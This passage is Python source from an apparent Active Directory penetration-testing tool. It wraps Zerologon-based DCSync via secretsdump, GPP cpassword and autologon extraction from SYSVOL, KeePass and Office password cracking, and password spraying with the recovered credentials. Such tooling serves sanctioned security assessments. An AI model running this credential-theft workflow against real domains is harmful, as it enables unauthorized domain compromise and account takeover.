    def execute_dcsync_zerologon(self, command, domain):
        from adscan_internal.integrations.impacket.runner import (
            RunCommandAdapter,
            run_raw_impacket_command,
        )
        from adscan_internal.rich_output import mark_sensitive

        try:
            marked_domain = mark_sensitive(domain, "domain")
            print_info(
                f"Executing DCSync (Zerologon) command for domain {marked_domain}: {command}"
            )
            completed_process = run_raw_impacket_command(
                command,
                script_name="secretsdump.py",
                timeout=300,
                command_runner=RunCommandAdapter(self.run_command),
            )
            if completed_process is None:
                print_error(
                    f"Error executing DCSync (Zerologon) for domain {marked_domain}: command did not return output."
                )
                return

            if completed_process.returncode == 0:
                output_decoded = completed_process.stdout
                # Existing credential parsing logic will use output_decoded (now completed_process.stdout)
                marked_domain = mark_sensitive(domain, "domain")
                print_success(
                    f"DCSync (Zerologon) command executed successfully for domain {marked_domain}."
                )  # Moved success message up for clarity

                # Search for the user's NTLM hash generically
                user_match = re.search(
                    r"^(.+?):\d+:[a-f0-9]{32}:([a-f0-9]{32}):",
                    output_decoded,
                    re.MULTILINE,
                )
                if user_match:
                    user_found = user_match.group(1)  # Capture the username
                    user_hash = user_match.group(2)  # Capture the NTLM hash

                    # Store username and hash in global variables
                    self.username = user_found

                    # Check if the NTLM hash is the specific one
                    if user_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":
                        # If the hash is empty, search for the most recent one in the history
                        history_match = re.search(
                            r"^(.*?)_history0:\d+:[a-f0-9]{32}:([a-f0-9]{32}):",
                            output_decoded,
                            re.MULTILINE,
                        )

                        if history_match:
                            latest_hash = history_match.group(
                                2
                            )  # Capture the NTLM hash from _history0
                            print_success(
                                f"Previous NT hash from the PDC: {latest_hash}"
                            )
                            self.hash = latest_hash
                            self.add_credential(domain, user_found, latest_hash)
                            self.zerologon_restore("")
                        else:
                            print_warning("Previous history hash not found.")

            else:
                marked_domain = mark_sensitive(domain, "domain")
                print_error(
                    f"Error executing DCSync (Zerologon) for domain {marked_domain}. Return code: {completed_process.returncode}"
                )
                if completed_process.stderr:
                    print_error(f"Error details: {completed_process.stderr.strip()}")
                elif completed_process.stdout:  # Sometimes errors are sent to stdout
                    print_error(
                        f"Output (possibly error): {completed_process.stdout.strip()}"
                    )
                # Removed the generic errors.decode().strip() as it's covered by completed_process.stderr

        except Exception as e:
            telemetry.capture_exception(e)
            marked_domain = mark_sensitive(domain, "domain")
            print_error(
                f"Exception during DCSync (Zerologon) execution for domain {marked_domain}: {str(e)}"
            )

            print_exception(
                exception=e
            )  # For more detailed exception traceback if verbose/debug mode is on

    def _render_cve_findings_summary(
        self,
        *,
        target_domain: str,
        title: str,
        findings: dict[str, dict[str, object]],
        scope: str = "all",
    ) -> None:
        """Render a CVE findings summary table with host samples."""
        from adscan_internal.rich_output import (
            create_styled_table,
            mark_sensitive,
            print_info,
            print_table,
        )

        def _format_hosts(hosts: set[str], *, max_items: int = 6) -> str:
            if not hosts:
                return "N/A"
            sample = sorted(hosts)[:max_items]
            rendered = ", ".join(mark_sensitive(host, "hostname") for host in sample)
            remaining = len(hosts) - len(sample)
            if remaining > 0:
                rendered = f"{rendered} +{remaining} more"
            return rendered

        severity_styles = {
            "critical": "[bold red]Critical[/bold red]",
            "high": "[bold orange3]High[/bold orange3]",
            "medium": "[bold yellow]Medium[/bold yellow]",
            "low": "[bold green]Low[/bold green]",
            "info": "[bold cyan]Info[/bold cyan]",
        }
        severity_order = {
            "critical": 0,
            "high": 1,
            "medium": 2,
            "low": 3,
            "info": 4,
        }

        rows: list[tuple] = []
        for key, payload in findings.items():
            if not isinstance(payload, dict):
                continue
            label = str(payload.get("label") or key)
            severity = str(payload.get("severity") or "info").lower()
            dcs = payload.get("dc") if isinstance(payload.get("dc"), set) else set()
            non_dcs = (
                payload.get("non_dc")
                if isinstance(payload.get("non_dc"), set)
                else set()
            )
            hosts = (
                payload.get("hosts") if isinstance(payload.get("hosts"), set) else set()
            )
            total = len(dcs) + len(non_dcs)
            if total == 0:
                continue
            rows.append(
                (
                    label,
                    severity,
                    len(dcs),
                    len(non_dcs),
                    total,
                    _format_hosts(set(hosts) or (set(dcs) | set(non_dcs))),
                )
            )

        if not rows:
            marked_domain = mark_sensitive(target_domain, "domain")
            print_info(f"No vulnerable hosts found in domain {marked_domain}.")
            return

        rows.sort(
            key=lambda r: (
                severity_order.get(str(r[1]).lower(), 99),
                str(r[0]).lower(),
            )
        )

        table = create_styled_table(title=title, expand=True)
        table.add_column("Vulnerability", style="bold")
        table.add_column("Severity", justify="center")
        if scope == "dcs":
            pass
        else:
            table.add_column("DCs", justify="right")
            table.add_column("Non-DCs", justify="right")
            table.add_column("Total", justify="right")
        table.add_column("Hosts (sample)")

        for label, severity, dc_count, non_dc_count, total, host_sample in rows:
            severity_style = severity_styles.get(
                str(severity).lower(), "[bold]Info[/bold]"
            )
            if scope == "dcs":
                table.add_row(
                    str(label),
                    severity_style,
                    str(host_sample),
                )
            else:
                table.add_row(
                    str(label),
                    severity_style,
                    str(dc_count),
                    str(non_dc_count),
                    str(total),
                    str(host_sample),
                )

        print_table(table)

    def _init_cve_findings(self, *, target_domain: str, scope: str) -> None:
        if not hasattr(self, "_cve_findings"):
            self._cve_findings = {}
        self._cve_findings[(target_domain, scope)] = {"findings": {}}

    def _record_cve_finding(
        self,
        *,
        target_domain: str,
        scope: str,
        key: str,
        label: str,
        severity: str,
        ip: str,
        host_label: str | None,
        is_dc: bool,
    ) -> None:
        if not hasattr(self, "_cve_findings"):
            self._cve_findings = {}
        bucket = self._cve_findings.setdefault((target_domain, scope), {"findings": {}})
        findings = bucket["findings"]
        entry = findings.setdefault(
            key,
            {
                "label": label,
                "severity": severity,
                "dc": set(),
                "non_dc": set(),
                "hosts": set(),
            },
        )
        if is_dc:
            entry["dc"].add(ip)
        else:
            entry["non_dc"].add(ip)
        if host_label:
            entry["hosts"].add(host_label)

    def _get_cve_findings(
        self, *, target_domain: str, scope: str
    ) -> dict[str, dict[str, object]]:
        if not hasattr(self, "_cve_findings"):
            return {}
        bucket = self._cve_findings.get((target_domain, scope)) or {}
        return bucket.get("findings", {})

    def _clear_cve_findings(self, *, target_domain: str, scope: str) -> None:
        if not hasattr(self, "_cve_findings"):
            return
        self._cve_findings.pop((target_domain, scope), None)

    def execute_netexec_gpp(self, command, type, domain: str | None = None):
        try:
            from adscan_internal.integrations.netexec.parsers import (
                parse_netexec_gpp_autologin_credentials,
                parse_netexec_gpp_password_credentials,
            )

            completed_process = self.run_command(command)

            # Handle cases where the command execution itself failed (e.g., timeout)
            if not isinstance(completed_process, subprocess.CompletedProcess):
                # run_command already reports failures.
                return

            def _update_gpp_report(report_key: str, detected: bool) -> None:
                if not domain:
                    return
                if detected:
                    self.update_report_field(domain, report_key, True)
                    return
                current_value = (
                    self.report.get(domain, {})
                    .get("vulnerabilities", {})
                    .get(report_key)
                    if getattr(self, "report", None)
                    else None
                )
                if current_value in (None, "NS", False):
                    self.update_report_field(domain, report_key, False)

            def _extract_log_path(cmd: str) -> str | None:
                import shlex

                try:
                    parts = shlex.split(cmd)
                except ValueError:
                    return None
                if "--log" in parts:
                    idx = parts.index("--log")
                    if idx + 1 < len(parts):
                        return parts[idx + 1]
                return None

            def _confirm_ambiguous_gpp_domain_check(
                *,
                username: str,
                source_xml: str | None,
                domain_name: str,
            ) -> bool:
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain_name, "domain")
                marked_source_xml = (
                    mark_sensitive(source_xml, "path")
                    if source_xml
                    else "unknown source"
                )
                print_info(
                    "Recovered a GPP credential whose account scope is ambiguous. "
                    "NetExec did not emit a domain-qualified userName, so this may be a "
                    "local account, a domain account referenced without domain, or a reused password."
                )
                print_info(
                    f"Account: {marked_username} | Domain to test: {marked_domain} | Source: {marked_source_xml}"
                )
                confirmer = getattr(self, "_questionary_confirm", None)
                prompt = (
                    f"Check whether {marked_username} also works as a domain credential "
                    f"in {marked_domain}?"
                )
                if callable(confirmer):
                    return bool(confirmer(prompt, default=True))
                return True

            def _store_ambiguous_gpp_candidate(
                *,
                domain_name: str,
                username: str,
                password: str,
                source_xml: str | None,
            ) -> None:
                from adscan_internal.services.credential_store_service import (
                    CredentialStoreService,
                )

                store_service = CredentialStoreService()
                update_result = store_service.update_domain_credential(
                    domains_data=self.domains_data,
                    domain=domain_name,
                    username=username.lower(),
                    credential=password,
                    is_hash=self.is_hash(password),
                )
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain_name, "domain")
                marked_source_xml = (
                    mark_sensitive(source_xml, "path")
                    if source_xml
                    else "unknown source"
                )
                if update_result.credential_changed:
                    print_info(
                        "Saved ambiguous GPP credential as an unverified candidate for "
                        f"{marked_username} in {marked_domain}. Source: {marked_source_xml}"
                    )
                else:
                    print_info_debug(
                        "Ambiguous GPP credential candidate was already stored for "
                        f"{marked_username} in {marked_domain}."
                    )

            # Check the process output
            if completed_process.returncode == 0:
                output_str = completed_process.stdout or ""
                output_lower = output_str.lower()
                found_passwords = (
                    "found password" in output_lower or "cpassword" in output_lower
                )
                found_autologin = "found" in output_lower and (
                    "autologon" in output_lower or "autologin" in output_lower
                )

                if type == "passwords":
                    parsed_passwords = parse_netexec_gpp_password_credentials(
                        output_str
                    )
                    found_passwords = bool(parsed_passwords) or found_passwords
                    _update_gpp_report("gpp_passwords", found_passwords)
                    if parsed_passwords and domain:
                        for entry in parsed_passwords:
                            if entry.is_domain_qualified:
                                credential_domain = (
                                    str(entry.domain or "").strip().lower() or domain
                                )
                                self.add_credential(
                                    credential_domain,
                                    entry.username,
                                    entry.password,
                                )
                                continue

                            if _confirm_ambiguous_gpp_domain_check(
                                username=entry.username,
                                source_xml=entry.source_xml,
                                domain_name=domain,
                            ):
                                verification_result = self.verify_domain_credentials(
                                    domain,
                                    entry.username,
                                    entry.password,
                                )
                                if verification_result:
                                    self.add_credential(
                                        domain,
                                        entry.username,
                                        entry.password,
                                        trusted_manual_validation=True,
                                        prompt_for_user_privs_after=False,
                                    )
                                    continue
                                marked_username = mark_sensitive(entry.username, "user")
                                marked_domain = mark_sensitive(domain, "domain")
                                print_info(
                                    "The ambiguous GPP credential did not verify as a domain "
                                    f"account for {marked_username} in {marked_domain}."
                                )

                            _store_ambiguous_gpp_candidate(
                                domain_name=domain,
                                username=entry.username,
                                password=entry.password,
                                source_xml=entry.source_xml,
                            )
                    if found_passwords and domain:
                        try:
                            from adscan_core.reporting.technical_report import (
                                record_technical_finding,
                            )

                            log_path = _extract_log_path(command)
                            record_technical_finding(
                                self,
                                domain,
                                key="gpp_passwords",
                                value=True,
                                details={
                                    "output_detected": "found_password",
                                    "credentials_detected": len(parsed_passwords),
                                    "source_xmls": sorted(
                                        {
                                            str(entry.source_xml).strip()
                                            for entry in parsed_passwords
                                            if str(entry.source_xml or "").strip()
                                        }
                                    ),
                                },
                                evidence=[
                                    {
                                        "type": "log",
                                        "summary": "GPP passwords output",
                                        "artifact_path": log_path,
                                    }
                                ]
                                if log_path
                                else None,
                            )
                        except Exception as exc:  # pragma: no cover
                            if not handle_optional_report_service_exception(
                                exc,
                                action="Technical finding sync",
                                debug_printer=print_info_debug,
                            ):
                                telemetry.capture_exception(exc)
                elif type == "autologin":
                    parsed_autologin = parse_netexec_gpp_autologin_credentials(
                        output_str
                    )
                    found_autologin = bool(parsed_autologin) or found_autologin
                    _update_gpp_report("gpp_autologin", found_autologin)
                    if parsed_autologin and domain:
                        for entry in parsed_autologin:
                            credential_domain = (
                                str(entry.domain or "").strip().lower() or domain
                            )
                            self.add_credential(
                                credential_domain,
                                entry.username,
                                entry.password,
                            )
                    if found_autologin and domain:
                        try:
                            from adscan_core.reporting.technical_report import (
                                record_technical_finding,
                            )

                            log_path = _extract_log_path(command)
                            record_technical_finding(
                                self,
                                domain,
                                key="gpp_autologin",
                                value=True,
                                details={
                                    "output_detected": "autologin",
                                    "credentials_detected": len(parsed_autologin),
                                    "source_xmls": sorted(
                                        {
                                            str(entry.source_xml).strip()
                                            for entry in parsed_autologin
                                            if str(entry.source_xml or "").strip()
                                        }
                                    ),
                                },
                                evidence=[
                                    {
                                        "type": "log",
                                        "summary": "GPP autologin output",
                                        "artifact_path": log_path,
                                    }
                                ]
                                if log_path
                                else None,
                            )
                        except Exception as exc:  # pragma: no cover
                            if not handle_optional_report_service_exception(
                                exc,
                                action="Technical finding sync",
                                debug_printer=print_info_debug,
                            ):
                                telemetry.capture_exception(exc)

                if found_passwords:
                    print_success("Passwords found in SYSVOL (GPP).")
                elif type == "autologin" and found_autologin:
                    print_success("Autologin credentials found in SYSVOL (GPP).")
                else:
                    print_info(f"No GPP {type} found in SYSVOL.")
            else:
                print_error(f"Error executing netexec for GPP {type} in SYSVOL.")
                # The output from the failed command is often useful for debugging.
                # Let's create a panel for it.
                output = completed_process.stdout + completed_process.stderr
                if output.strip():
                    self.console.print(
                        Panel(
                            output.strip(),
                            title=f"NXC GPP Output ({type})",
                            border_style="dim red",
                            expand=False,
                        )
                    )

        except Exception as e:
            telemetry.capture_exception(e)
            # This outer try/except catches potential errors in the *processing* of the command's result,
            # since run_command handles its own execution errors.
            print_error(
                f"An unexpected error occurred while processing the GPP check result: {str(e)}"
            )

            print_exception(show_locals=False, exception=e)

    def _process_cpassword_text(
        self,
        text: str,
        domain: str,
        source: str | None = None,
        source_hosts: list[str] | None = None,
        source_shares: list[str] | None = None,
        auth_username: str | None = None,
    ) -> bool:
        """Extract and decrypt cpassword entries from arbitrary text content."""
        from adscan_internal.cli.creds import process_cpassword_text

        return process_cpassword_text(
            self,
            text,
            domain,
            source,
            source_hosts=source_hosts,
            source_shares=source_shares,
            auth_username=auth_username,
        )

    def _render_keepass_entries_table(
        self,
        *,
        source_path: str,
        entries: list[object],
    ) -> None:
        """Render a compact KeePass entry preview table."""
        from rich.panel import Panel
        from rich.table import Table

        table = Table(
            title=f"KeePass Entries ({len(entries)})",
            show_header=True,
            header_style="bold magenta",
        )
        table.add_column("#", style="dim", width=4, justify="right")
        table.add_column("Group", style="cyan", no_wrap=False, max_width=24)
        table.add_column("Title", style="cyan", no_wrap=False, max_width=24)
        table.add_column("Username", style="green", no_wrap=False, max_width=24)
        table.add_column("Password", style="magenta", no_wrap=False, max_width=28)
        table.add_column("URL", style="dim", no_wrap=False, max_width=28)

        preview_limit = 12
        for idx, entry in enumerate(entries[:preview_limit], start=1):
            group_path = mark_sensitive(
                str(getattr(entry, "group_path", "") or "-"),
                "path",
            )
            title = mark_sensitive(str(getattr(entry, "title", "") or "-"), "text")
            username = mark_sensitive(
                str(getattr(entry, "username", "") or "-"),
                "user",
            )
            password = mark_sensitive(
                str(getattr(entry, "password", "") or "-"),
                "password",
            )
            url = mark_sensitive(str(getattr(entry, "url", "") or "-"), "path")
            table.add_row(
                str(idx),
                group_path,
                title,
                username,
                password,
                url,
            )

        self.console.print(Panel(table, border_style="blue"))
        if len(entries) > preview_limit:
            print_info(
                f"KeePass entry preview truncated to first {preview_limit} rows."
            )
        print_info(
            "Review the persisted KeePass entries report for the complete dataset."
        )
        print_info(f"Source KeePass artifact: {mark_sensitive(source_path, 'path')}")

    def _select_keepass_entries_to_validate(
        self,
        *,
        entries: list[object],
    ) -> list[object]:
        """Select which KeePass entries should be validated as credentials."""
        if not entries:
            return []
        if bool(getattr(self, "auto", False)) or _should_disable_interactive_prompts(
            self
        ):
            return list(entries)

        options = [
            "Validate and store all username+password entries",
            "Validate and store one selected entry",
            "Skip validation for now",
        ]
        selector = getattr(self, "_questionary_select", None)
        selected_idx = 0
        if callable(selector):
            idx = selector(
                "Choose how to handle extracted KeePass credentials:",
                options,
                default_idx=0,
            )
            if idx is None:
                return []
            selected_idx = idx
        if selected_idx == 2:
            return []
        if selected_idx == 1:
            row_options = []
            for entry in entries:
                username = str(getattr(entry, "username", "") or "").strip() or "-"
                title = str(getattr(entry, "title", "") or "").strip() or "-"
                group_path = str(getattr(entry, "group_path", "") or "").strip() or "-"
                row_options.append(f"{username} | {title} | {group_path}")
            if callable(selector):
                idx = selector(
                    "Select one KeePass entry to validate and store:",
                    row_options,
                    default_idx=0,
                )
                if idx is None:
                    return []
                if 0 <= idx < len(entries):
                    return [entries[idx]]
            return []
        return list(entries)

    def _offer_keepass_password_spraying(
        self,
        *,
        domain: str,
        passwords: list[str],
        source_path: str,
        source_hosts: list[str] | None = None,
        source_shares: list[str] | None = None,
        auth_username: str | None = None,
    ) -> None:
        """Offer centralized multi-password spraying for extracted KeePass passwords."""
        unique_passwords: list[str] = []
        seen_passwords: set[str] = set()
        for password in passwords:
            normalized = str(password or "").strip()
            if not normalized or normalized in seen_passwords:
                continue
            seen_passwords.add(normalized)
            unique_passwords.append(normalized)
        if not unique_passwords or domain not in getattr(self, "domains", []):
            return
        if self.type == "ctf" and self._is_ctf_domain_pwned(domain):
            print_info_debug(
                "Skipping KeePass spraying prompt because the CTF domain is already pwned."
            )
            return
        try:
            from adscan_internal.services.share_credential_provenance_service import (
                ShareCredentialProvenanceService,
            )

            provenance_service = ShareCredentialProvenanceService()
            source_context = provenance_service.build_source_context(
                hosts=source_hosts,
                shares=source_shares,
                artifact=source_path,
                auth_username=auth_username,
                origin="share_spidering",
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            source_context = None
        self.spraying_with_passwords(
            domain,
            unique_passwords,
            source_context=source_context,
            source_label=f"KeePass artifact {source_path}",
        )

    def _process_keepass_artifact(
        self,
        domain: str,
        source_path: str,
        source_hosts: list[str] | None = None,
        source_shares: list[str] | None = None,
        auth_username: str | None = None,
    ) -> int:
        """Crack and extract one KeePass artifact using reusable services."""
        from adscan_internal.cli.cracking import resolve_cracking_wordlist
        from adscan_internal.services.share_credential_provenance_service import (
            ShareCredentialProvenanceService,
        )

        marked_source = mark_sensitive(source_path, "path")
        keepass2john_path = self._resolve_keepass2john_path()
        if not keepass2john_path:
            print_warning(
                f"KeePass artifact found at {marked_source}, but keepass2john is not available."
            )
            return 0

        print_operation_header(
            "KeePass Artifact Analysis",
            details={
                "Domain": mark_sensitive(domain, "domain"),
                "Artifact": marked_source,
                "Tooling": "keepass2john + john + pykeepass",
            },
            icon="🔐",
        )
        wordlist_path = resolve_cracking_wordlist(
            shell=self,
            hash_type="keepass",
            domain=domain,
            wordlists_dir=WORDLISTS_INSTALL_DIR,
            failed=False,
        )
        report_dir = os.path.join("domains", domain, "smb", "keepass")
        result = self._get_keepass_artifact_service().process_local_artifact(
            domain=domain,
            source_path=source_path,
            wordlist_path=wordlist_path,
            keepass2john_path=keepass2john_path,
            python_executable="python3",
            report_dir=report_dir,
        )
        if result.hash_file:
            print_info(
                f"KeePass John hash saved to {mark_sensitive(result.hash_file, 'path')}."
            )
        if result.cracked_password:
            print_success(
                "KeePass master password cracked successfully: "
                f"{mark_sensitive(result.cracked_password, 'password')}"
            )
        if result.error_message:
            print_warning(result.error_message)
        if result.entries_report_path:
            print_info(
                "KeePass entries report saved to "
                f"{mark_sensitive(result.entries_report_path, 'path')}."
            )
        if not result.entries:
            return 1 if result.cracked_password else 0

        self._render_keepass_entries_table(
            source_path=source_path,
            entries=result.entries,
        )

        entries_to_validate = [
            entry
            for entry in result.entries
            if str(getattr(entry, "username", "") or "").strip()
            and str(getattr(entry, "password", "") or "").strip()
        ]
        selected_entries = self._select_keepass_entries_to_validate(
            entries=entries_to_validate
        )
        provenance_service = ShareCredentialProvenanceService()
        for entry in selected_entries:
            normalized_username = self._normalize_keepass_entry_username(
                str(getattr(entry, "username", "") or "").strip(),
                domain,
            )
            password = str(getattr(entry, "password", "") or "").strip()
            if not normalized_username or not password:
                continue
            source_steps = provenance_service.build_credential_source_steps(
                relation="PasswordInKeePass",
                edge_type="share_password",
                source="keepass_database",
                secret=password,
                hosts=source_hosts,
                shares=source_shares,
                artifact=source_path,
                auth_username=auth_username,
                origin="share_spidering",
            )
            self.add_credential(
                domain,
                normalized_username,
                password,
                source_steps=source_steps,
                prompt_for_user_privs_after=False,
            )

        self._offer_keepass_password_spraying(
            domain=domain,
            passwords=[
                str(getattr(entry, "password", "") or "").strip()
                for entry in result.entries
            ],
            source_path=source_path,
            source_hosts=source_hosts,
            source_shares=source_shares,
            auth_username=auth_username,
        )
        return len(result.entries)

    def _process_office_artifact(
        self,
        domain: str,
        source_path: str,
        source_hosts: list[str] | None = None,
        source_shares: list[str] | None = None,
        auth_username: str | None = None,
    ) -> int:
        """Crack one encrypted Office artifact with office2john + John."""
        from adscan_internal.cli.cracking import resolve_cracking_wordlist
        from adscan_internal.cli.office_artifact_renderer import (
            render_office_vault_detected,
            render_office_vault_failed,
            render_office_vault_unlocked,
        )
        from adscan_internal.services.john_artifact_cracking_service import (
            JohnArtifactCrackingService,
        )
        from adscan_internal.services.office_artifact_service import (
            OfficeArtifactService,
        )

        marked_source = mark_sensitive(source_path, "path")
        office2john_path = JohnArtifactCrackingService.resolve_converter_path("office2john")
        if not office2john_path:
            print_warning(
                f"Encrypted Office artifact found at {marked_source}, "
                "but office2john is not available."
            )
            return 0

        workspace_cwd = self._get_workspace_cwd()
        render_office_vault_detected(
            file_path=source_path,
            workspace_cwd=workspace_cwd,
            office2john_available=True,
        )

        wordlist_path = resolve_cracking_wordlist(
            shell=self,
            hash_type="office",
            domain=domain,
            wordlists_dir=WORDLISTS_INSTALL_DIR,
            failed=False,
        )
        report_dir = os.path.join("domains", domain, "smb", "office_artifacts")
        svc = OfficeArtifactService()
        result = svc.crack(
            domain=domain,
            source_path=source_path,
            wordlist_path=wordlist_path,
            office2john_path=office2john_path,
            python_executable="python3",
            report_dir=report_dir,
        )

        if result.cracked:
            render_office_vault_unlocked(result=result, workspace_cwd=workspace_cwd)
            # Feed the cracked password into the credential pipeline so it can
            # be used for spraying and validation like any other found credential.
            self.handle_found_credentials(
                {
                    "office_artifact": [
                        (result.cracked_password, 1.0, source_path, None, source_path)
                    ]
                },
                domain,
                source_hosts=source_hosts or [],
                source_shares=source_shares or [],
                auth_username=auth_username or "",
                source_artifact="encrypted Office document",
                analysis_origin="deterministic",
                ai_findings=[],
            )
            return 1
        else:
            render_office_vault_failed(result=result, workspace_cwd=workspace_cwd)
            return 0

    @staticmethod
    def _looks_like_cpassword_value(value: str | None) -> bool:
        """Heuristic check to determine if a string resembles a cpassword."""
        from adscan_internal.cli.creds import looks_like_cpassword_value

        return looks_like_cpassword_value(value)

    @staticmethod
    def _read_line_from_file(file_path: str | None, line_num: int | None) -> str | None:
        """Return a specific line from file, stripping newline."""
        from adscan_internal.cli.creds import read_line_from_file

        return read_line_from_file(file_path, line_num)

    def _filter_cpassword_credentials(
        self,
        credentials_list: list[tuple],
        domain: str,
        *,
        source_hosts: list[str] | None = None,
        source_shares: list[str] | None = None,
        auth_username: str | None = None,
    ) -> list[tuple]:
        """Remove cpassword entries from credential candidates and process them separately."""
        filtered_credentials: list[tuple] = []

        for cred_tuple in credentials_list:
            if len(cred_tuple) < 5:
                filtered_credentials.append(cred_tuple)
                continue

            value, ml_prob, context_line, line_num, file_path = cred_tuple
            context_text = context_line or self._read_line_from_file(
                file_path, line_num
            )
            snippet = context_text or ""

            is_cpassword_candidate = False
            if snippet and "cpassword" in snippet.lower():
                is_cpassword_candidate = True
            elif self._looks_like_cpassword_value(value):
                is_cpassword_candidate = True

            if is_cpassword_candidate:
                source_desc = None
                if file_path:
                    source_desc = file_path
                    if line_num:
                        source_desc = f"{file_path}:{line_num}"

                snippet_for_processing = (
                    snippet if "cpassword" in snippet.lower() else None
                )
                if not snippet_for_processing:
                    snippet_for_processing = f'cpassword="{value}"'

                print_info(
                    "Detected potential Group Policy cpassword in share results. "
                    "Decrypting and storing it instead of using it for password spraying."
                )
                processed = self._process_cpassword_text(
                    snippet_for_processing,
                    domain,
                    source_desc,
                    source_hosts=source_hosts,
                    source_shares=source_shares,
                    auth_username=auth_username,
                )
                if not processed:
                    print_warning(
                        "Unable to extract cpassword details automatically. "
                        "Review the spidering logs manually."
                    )
                continue

            filtered_credentials.append(cred_tuple)

        return filtered_credentials

